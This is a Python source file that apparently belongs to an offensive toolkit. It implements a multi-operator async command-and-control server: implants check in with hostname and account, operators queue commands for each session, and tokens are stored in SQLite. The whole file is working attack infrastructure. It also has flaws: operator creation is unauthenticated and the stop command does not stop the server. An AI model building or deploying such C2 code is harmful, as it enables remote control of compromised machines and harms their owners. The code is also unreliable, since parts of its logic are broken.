"""Multi-operator support — async server with authentication and shared session state.
Replaces the singleton synchronous server with an async HTTP server (aiohttp)
that supports multiple concurrent operators, per-operator authentication,
and shared session state backed by SQLite."""

import asyncio
import json
import hashlib
import secrets
import sqlite3
import os
from datetime import datetime, timezone
from typing import Optional
from aiohttp import web


class OperatorAuth:
    """Simple token-based operator authentication."""

    def __init__(self, db_path: str = "operators.db"):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS operators (
                username TEXT PRIMARY KEY,
                token_hash TEXT NOT NULL,
                created_at TEXT NOT NULL,
                last_login TEXT
            )
        """)
        conn.commit()
        conn.close()

    def create_operator(self, username: str) -> str:
        """Create a new operator and return their API token."""
        token = secrets.token_urlsafe(32)
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        now = datetime.now(timezone.utc).isoformat()

        conn = sqlite3.connect(self.db_path)
        try:
            conn.execute(
                "INSERT INTO operators (username, token_hash, created_at) VALUES (?, ?, ?)",
                (username, token_hash, now)
            )
            conn.commit()
        finally:
            conn.close()

        return token

    def authenticate(self, token: str) -> Optional[str]:
        """Validate a token and return the operator username, or None if invalid."""
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        conn = sqlite3.connect(self.db_path)
        try:
            cursor = conn.execute(
                "SELECT username FROM operators WHERE token_hash = ?", (token_hash,)
            )
            row = cursor.fetchone()
            if row:
                now = datetime.now(timezone.utc).isoformat()
                conn.execute(
                    "UPDATE operators SET last_login = ? WHERE token_hash = ?",
                    (now, token_hash)
                )
                conn.commit()
                return row[0]
        finally:
            conn.close()
        return None

    def list_operators(self) -> list[dict]:
        conn = sqlite3.connect(self.db_path)
        try:
            cursor = conn.execute("SELECT username, created_at, last_login FROM operators")
            return [{"username": r[0], "created_at": r[1], "last_login": r[2]} for r in cursor.fetchall()]
        finally:
            conn.close()


class AsyncC2Server:
    """Async C2 server using aiohttp. Supports multiple operators via API tokens.
    Each operator can manage their own sessions and issue commands."""

    def __init__(self, host: str = "0.0.0.0", port: int = 80, auth: OperatorAuth = None):
        self.host = host
        self.port = port
        self.auth = auth or OperatorAuth()
        self._sessions: dict[int, dict] = {}  # session_id -> session data
        self._commands: dict[int, list[str]] = {}  # session_id -> pending commands
        self._next_session_id = 1
        self._operator_sessions: dict[str, int] = {}  # operator -> active session_id

    def _require_auth(self, request: web.Request) -> Optional[str]:
        """Check Authorization header and return operator username or raise 401."""
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            raise web.HTTPUnauthorized(text="Missing or invalid Authorization header")
        token = auth_header[7:]
        operator = self.auth.authenticate(token)
        if operator is None:
            raise web.HTTPUnauthorized(text="Invalid token")
        return operator

    async def handle_session_checkin(self, request: web.Request) -> web.Response:
        """Implant session check-in endpoint."""
        try:
            data = await request.json()
        except Exception:
            raise web.HTTPBadRequest(text="Invalid JSON")

        client_id = data.get("client_id", "")
        hostname = data.get("hostname", "")
        account = data.get("account", "")

        # Register or update session
        session_id = None
        for sid, sess in self._sessions.items():
            if sess.get("client_id") == client_id:
                session_id = sid
                break

        if session_id is None:
            session_id = self._next_session_id
            self._next_session_id += 1
            self._sessions[session_id] = {
                "client_id": client_id,
                "hostname": hostname,
                "account": account,
                "first_seen": datetime.now(timezone.utc).isoformat(),
            }

        self._sessions[session_id]["last_seen"] = datetime.now(timezone.utc).isoformat()

        # Check for pending commands
        commands = self._commands.get(session_id, [])
        cmd_to_send = commands.pop(0) if commands else None

        return web.json_response({
            "session_id": session_id,
            "status": "ok",
            "command": cmd_to_send,
        })

    async def handle_command_output(self, request: web.Request) -> web.Response:
        """Receive command output from implant."""
        operator = self._require_auth(request)
        try:
            data = await request.json()
        except Exception:
            raise web.HTTPBadRequest(text="Invalid JSON")

        session_id = data.get("session_id")
        output = data.get("output", "")

        if session_id in self._sessions:
            print(f"[Session {session_id}] {output[:200]}")

        return web.json_response({"status": "ok"})

    async def handle_operator_command(self, request: web.Request) -> web.Response:
        """Operator sends a command to a specific session."""
        operator = self._require_auth(request)
        try:
            data = await request.json()
        except Exception:
            raise web.HTTPBadRequest(text="Invalid JSON")

        session_id = data.get("session_id")
        command = data.get("command", "")

        if session_id not in self._sessions:
            raise web.HTTPNotFound(text=f"Session {session_id} not found")

        if session_id not in self._commands:
            self._commands[session_id] = []
        self._commands[session_id].append(command)

        return web.json_response({"status": "queued", "session_id": session_id})

    async def handle_operator_sessions(self, request: web.Request) -> web.Response:
        """List all sessions visible to the operator."""
        operator = self._require_auth(request)
        sessions = []
        for sid, sess in self._sessions.items():
            sessions.append({"session_id": sid, **sess})
        return web.json_response({"sessions": sessions})

    async def handle_create_operator(self, request: web.Request) -> web.Response:
        """Create a new operator (admin-only action)."""
        try:
            data = await request.json()
        except Exception:
            raise web.HTTPBadRequest(text="Invalid JSON")

        username = data.get("username", "")
        if not username:
            raise web.HTTPBadRequest(text="username required")

        token = self.auth.create_operator(username)
        return web.json_response({"username": username, "token": token})

    def start(self):
        """Start the async server."""
        app = web.Application()
        app.router.add_post("/api/session/checkin", self.handle_session_checkin)
        app.router.add_post("/api/session/output", self.handle_command_output)
        app.router.add_post("/api/operator/command", self.handle_operator_command)
        app.router.add_get("/api/operator/sessions", self.handle_operator_sessions)
        app.router.add_post("/api/operator/create", self.handle_create_operator)

        print(f"Async C2 server starting on {self.host}:{self.port}")
        print(f"Operator auth: token-based (use Authorization: Bearer <token>)")
        web.run_app(app, host=self.host, port=self.port)


# Module-level singleton
_async_server: Optional[AsyncC2Server] = None


def run(args: list[str]) -> str:
    """Module entry point for multi-operator server management.

    Usage:
        multiop server start [host:0.0.0.0] [port:8080]
        multiop server stop
        multiop operator create <username>
        multiop operator list
    """
    global _async_server

    if not args:
        return "Usage: multiop server|operator"

    if args[0] == "server":
        if len(args) < 2:
            return "Usage: multiop server start|stop"

        if args[1] == "start":
            host = args[2] if len(args) > 2 else "0.0.0.0"
            port = int(args[3]) if len(args) > 3 else 8080

            if _async_server is not None:
                return "Async C2 server already running"

            _async_server = AsyncC2Server(host, port)
            _async_server.start()
            return f"Async C2 server started on {host}:{port}"

        elif args[1] == "stop":
            if _async_server is None:
                return "Async C2 server not running"
            del _async_server
            _async_server = None
            return "Async C2 server stopped"

        else:
            return f"Unknown server command: {args[1]}"

    elif args[0] == "operator":
        if len(args) < 2:
            return "Usage: multiop operator create|list"

        auth = OperatorAuth()

        if args[1] == "create":
            if len(args) < 3:
                return "Usage: multiop operator create <username>"
            username = args[2]
            token = auth.create_operator(username)
            return f"Operator '{username}' created. Token: {token}\nStore this token securely — it cannot be recovered."

        elif args[1] == "list":
            operators = auth.list_operators()
            if not operators:
                return "No operators registered"
            lines = ["Registered operators:"]
            for op in operators:
                lines.append(f"  {op['username']} — created: {op['created_at']}, last login: {op['last_login'] or 'never'}")
            return "\n".join(lines)

        else:
            return f"Unknown operator command: {args[1]}"

    else:
        return f"Unknown command: {args[0]}"
